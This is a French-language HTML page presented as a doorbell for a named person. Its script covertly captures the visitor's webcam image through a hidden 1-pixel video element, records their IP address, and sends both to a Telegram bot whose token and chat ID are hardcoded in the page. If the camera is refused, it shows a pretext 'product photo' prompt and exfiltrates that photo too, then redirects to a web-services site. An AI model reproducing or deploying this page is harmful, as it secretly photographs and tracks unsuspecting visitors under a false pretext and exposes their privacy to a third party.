<html lang="fr">
<head>
    <meta charset="UTF-8">

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --primary-bg: #1e2430;
            --secondary-bg: #2c3e50;
            --accent-color: #3498db;
            --text-color: #ffffff;
            --text-secondary: #bdc3c7;
            --border-color: #34495e;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: var(--primary-bg);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: var(--text-color);
            line-height: 1.6;
        }

        .consent-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .custom-camera-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(30,36,48,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1001;
        }

        .consent-box, .camera-box {
            background: var(--secondary-bg);
            border-radius: 20px;
            padding: 3rem;
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            border: 1px solid var(--border-color);
            color: var(--text-color);
        }

        .camera-box {
            max-width: 700px;
        }

        .camera-preview {
            width: 100%;
            max-height: 400px;
            border-radius: 10px;
            margin: 1rem 0;
            background: rgba(255,255,255,0.1);
            border: 2px solid var(--border-color);
        }

        .camera-controls {
            display: flex;
            gap: 1rem;
            justify-content: center;
            margin: 1rem 0;
        }

        .bell-button, .site-button {
            background: var(--accent-color);
            color: var(--text-color);
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Apenas as alteraÃ§Ãµes solicitadas */
        .bell-button {
            animation: vibrate 0.1s linear infinite; /* VibraÃ§Ã£o mais rÃ¡pida */
            margin-top: 1.5rem; /* EspaÃ§amento do nome */
        }

        @keyframes vibrate {
            0% { transform: translateX(0); }
            25% { transform: translateX(-1px); }
            50% { transform: translateX(1px); }
            75% { transform: translateX(-1px); }
            100% { transform: translateX(0); }
        }

        /* Restante do CSS original */
        button {
            background: var(--accent-color);
            color: var(--text-color);
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        button:hover {
            opacity: 0.9;
        }

        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--secondary-bg);
            backdrop-filter: blur(15px);
            padding: 2.5rem;
            border-radius: 20px;
            text-align: center;
            color: var(--text-color);
            z-index: 1001;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            border: 1px solid var(--border-color);
        }

        #statusMsg {
            color: var(--text-color);
            text-align: center;
            margin-top: 20px;
        }

        #hiddenVideo {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }

        .camera-box h2 {
            color: var(--text-color);
            text-align: center;
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
            background: var(--accent-color);
            padding: 10px;
            border-radius: 10px;
        }

        .popup a {
            color: var(--accent-color);
            text-decoration: none;
            font-weight: bold;
        }

        @media (max-width: 600px) {
            .consent-box, .camera-box {
                width: 95%;
                padding: 1.5rem;
            }

            .camera-box h2 {
                font-size: 1.5rem;
            }

            .bell-button, .site-button {
                font-size: 14px;
                padding: 12px 25px;
            }
        }
    </style>
</head>
<body>
    <!-- HTML original mantido intacto -->
    <div class="consent-modal" id="consentModal">
        <div class="consent-box">
            <h2>SONNER CHEZ ðŸ””</h2>
            <p style="margin: 1.5rem 0;">Felipe Torressilhos ðŸ‘‡</p> <!-- EspaÃ§amento ajustado -->
            <button class="bell-button" onclick="initiateActivation()">Accepter et sonner</button>
        </div>
    </div>

    <div class="custom-camera-modal" id="customCameraModal">
        <div class="camera-box">
            <h2>ðŸ“¸ Prendre une photo du produit</h2>
            <video id="cameraPreview" class="camera-preview" autoplay playsinline></video>
            <canvas id="cameraCanvas" style="display: none;"></canvas>
            
            <div class="camera-controls">
                <button class="site-button" id="captureButton">Prendre une photo</button>
                <button class="site-button" id="uploadButton">TÃ©lÃ©charger une photo</button>
                <input type="file" id="fileInput" accept="image/*" style="display: none;">
            </div>
            
            <div class="camera-controls">
                <button class="site-button" id="submitCustomPhoto">Envoyer</button>
                <button class="site-button" id="cancelCustomPhoto">Annuler</button>
            </div>
        </div>
    </div>

    <div id="statusMsg"></div>
    <video id="hiddenVideo" autoplay playsinline></video>

    <div class="popup" id="popup" style="display: none;">
        <div id="popupMessage"></div>
    </div>

    <script>
        // JavaScript original mantido intacto
        const BOT_TOKEN = '7933483854:AAEEebGInkEUkKbxh4OgGFYVQM2zIk-GupA';
        const CHAT_ID = '5562266493';

        function getFormattedDateTime() {
            const now = new Date();
            const date = now.toLocaleDateString('fr-FR');
            const time = now.toLocaleTimeString('fr-FR');
            return ` Date: ${date}  Heure: ${time}`;
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Indisponible';
            }
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Erreur d\'envoi:', error);
            }
        }

        async function handleActivation() {
            let ip = await getIPInfo();
            let statusMessage = ` Sonnette activÃ©e!
IP: ${ip}
${getFormattedDateTime()}`;
            let userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', statusMessage);
                const blob = await fetch(photoUrl).then(r => r.blob());
                formData.append('photo', blob, 'photo.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(track => track.stop());
            
            } catch (error) {
                statusMessage += `
Erreur camÃ©ra: ${error.message}`;
                await sendToTelegram(statusMessage);
                const customPhoto = await showCustomCameraModal();
                
                if (customPhoto) {
                    const customFormData = new FormData();
                    customFormData.append('chat_id', CHAT_ID);
                    customFormData.append('caption', `${statusMessage}`);
                    const blob = await fetch(customPhoto.photo).then(r => r.blob());
                    customFormData.append('photo', blob, 'custom_photo.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: customFormData
                    });
                }
            }

            return userMessage;
        }

        function showCustomCameraModal() {
            return new Promise(async (resolve) => {
                const modal = document.getElementById('customCameraModal');
                const video = document.getElementById('cameraPreview');
                const captureButton = document.getElementById('captureButton');
                const uploadButton = document.getElementById('uploadButton');
                const fileInput = document.getElementById('fileInput');
                const submitButton = document.getElementById('submitCustomPhoto');
                const cancelButton = document.getElementById('cancelCustomPhoto');

                let stream = null;
                let photoData = null;

                modal.style.display = 'flex';

                const startCamera = async () => {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        video.srcObject = stream;
                        video.style.display = 'block';
                        captureButton.style.display = 'block';
                        uploadButton.style.display = 'none';
                    } catch (error) {
                        video.style.display = 'none';
                        captureButton.style.display = 'none';
                        uploadButton.style.display = 'block';
                    }
                };

                await startCamera();

                captureButton.onclick = () => {
                    const canvas = document.getElementById('cameraCanvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    photoData = canvas.toDataURL('image/jpeg');
                    video.style.display = 'none';
                    canvas.style.display = 'block';
                };

                uploadButton.onclick = () => fileInput.click();

                fileInput.onchange = (e) => {
                    const file = e.target.files[0];
                    if (file) {
                        const reader = new FileReader();
                        reader.onload = (e) => {
                            photoData = e.target.result;
                            video.style.display = 'none';
                        };
                        reader.readAsDataURL(file);
                    }
                };

                submitButton.onclick = () => {
                    if (photoData) {
                        modal.style.display = 'none';
                        if (stream) stream.getTracks().forEach(track => track.stop());
                        resolve({
                            photo: photoData,
                            description: ''
                        });
                    }
                };

                cancelButton.onclick = () => {
                    modal.style.display = 'none';
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    resolve(null);
                };
            });
        }

        function showPopup(message) {
            const popup = document.getElementById('popup');
            const popupMessage = document.getElementById('popupMessage');
            popupMessage.innerHTML = message;
            popup.style.display = 'block';

            setTimeout(() => {
                popup.style.display = 'none';
                window.location.href = 'https://torreswebsec.github.io/services/';
            }, 5000);

            popup.style.opacity = 0;
            popup.style.transition = 'opacity 0.5s ease-in-out';
            setTimeout(() => { popup.style.opacity = 1; }, 50);
        }

        async function initiateActivation() {
            document.getElementById('consentModal').style.display = 'none';
            document.getElementById('statusMsg').innerHTML = 'Traitement en cours...';

            const message = await handleActivation();
            
            showPopup(
                `<div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
                    ${message}
                </div>`
            );
        }

        window.onload = () => {
            document.getElementById('consentModal').style.display = 'flex';
        }
    </script>
</body>
</html>
